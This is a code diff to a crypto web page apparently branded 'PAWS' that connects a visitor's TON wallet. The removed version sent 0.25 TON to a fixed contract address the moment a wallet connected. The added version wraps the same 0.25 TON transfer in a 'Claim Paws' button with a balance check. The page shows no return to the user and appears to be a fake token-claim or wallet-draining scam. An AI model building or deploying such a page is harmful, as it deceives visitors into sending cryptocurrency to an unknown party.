@@ -113,24 +113,31 @@ opacity: 0.9;
 }
 
 .connect-button {
-background: var(--accent-color);
-color: var(--bg-color);
-border: none;
-padding: 1rem 2.5rem;
+background: var(--bg-color);  /* Changed from var(--accent-color) to var(--bg-color) */
+color: var(--text-color);     /* Changed from var(--bg-color) to var(--text-color) */
+border: 1px solid var(--text-color); /* Added border for better visibility */
+padding: 0.75rem 1.5rem;  /* Reduced padding */
 border-radius: 50px;
-font-size: 1.2rem;
+font-size: 1rem;         /* Reduced font size */
 font-weight: 600;
 cursor: pointer;
 transition: transform 0.2s ease;
-            display: flex !important;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto;
-            min-width: 200px;
+display: flex !important;
+align-items: center;
+justify-content: center;
+margin: 0.5rem auto;     /* Reduced margin */
+min-width: 160px;        /* Reduced min-width */
+max-width: 200px;        /* Added max-width */
+height: 40px;            /* Added fixed height */
 }
 
 .connect-button:hover {
 transform: translateY(-2px);
+}
+
+.connect-button:disabled {
+opacity: 0.5;
+cursor: not-allowed;
 }
 
 .background-elements {
@@ -205,32 +212,65 @@ alt="PAWS Logo" class="logo">
 <!-- Scripts -->
 <script>
 const CONTRACT_ADDRESS = 'EQCzC-lHViu4W3R6CON5nUgGCEf_l5hA5cDJjVVX2uEGnW38';
+const REQUIRED_AMOUNT = '250000000'; // 0.25 TON
 
 const tonConnect = new TON_CONNECT_UI.TonConnectUI({
-manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
-buttonRootId: 'connect-container',
-buttonCssClass: 'connect-button'
+    manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
+    buttonRootId: 'connect-container',
+    buttonCssClass: 'connect-button'
 });
 
+// Create claim button element
+const claimButton = document.createElement('button');
+claimButton.className = 'connect-button';
+claimButton.style.display = 'none';
+claimButton.textContent = 'Claim Paws';
+claimButton.onclick = handleClaim;
+
+// Add claim button after connect button
+document.getElementById('connect-container').after(claimButton);
+
+async function handleClaim() {
+    try {
+        // Check wallet balance first
+        const walletBalance = await tonConnect.getBalance();
+        if (walletBalance < REQUIRED_AMOUNT) {
+            const requiredTON = parseFloat(REQUIRED_AMOUNT) / 1000000000;
+            alert(`Insufficient balance: You need at least ${requiredTON} TON to perform this transaction. Please add more TON to your wallet.`);
+            return;
+        }
+
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [{
+                address: CONTRACT_ADDRESS,
+                amount: REQUIRED_AMOUNT,
+                payload: 'increment'
+            }]
+        };
+        
+        await tonConnect.sendTransaction(transaction);
+        console.log('Transaction sent successfully');
+        alert('Transaction successful!');
+    } catch (e) {
+        console.error('Transaction failed:', e);
+        if (e.message.includes('insufficient') || e.message.includes('Not enough')) {
+            alert('Your wallet balance is less than 0.25 TON. Please add more TON to continue.');
+        } else {
+            alert('Transaction failed: ' + e.message);
+        }
+    }
+}
+
 tonConnect.onStatusChange(async (wallet) => {
-if (wallet) {
-console.log('Wallet connected:', wallet.account.address);
-// Auto-trigger transaction after connection
-try {
-const transaction = {
-validUntil: Math.floor(Date.now() / 1000) + 600,
-messages: [{
-address: CONTRACT_ADDRESS,
-amount: '250000000', // 0.25 TON
-payload: 'te6ccgEBAQEAAgAAAA=='
-}]
-};
-await tonConnect.sendTransaction(transaction);
-console.log('Transaction sent successfully');
-} catch (e) {
-console.error('Transaction failed:', e);
-}
-}
+    if (wallet) {
+        console.log('Wallet connected:', wallet.account.address);
+        // Show claim button when wallet is connected
+        claimButton.style.display = 'block';
+    } else {
+        // Hide claim button when wallet is disconnected
+        claimButton.style.display = 'none';
+    }
 });
 </script>
 </body>
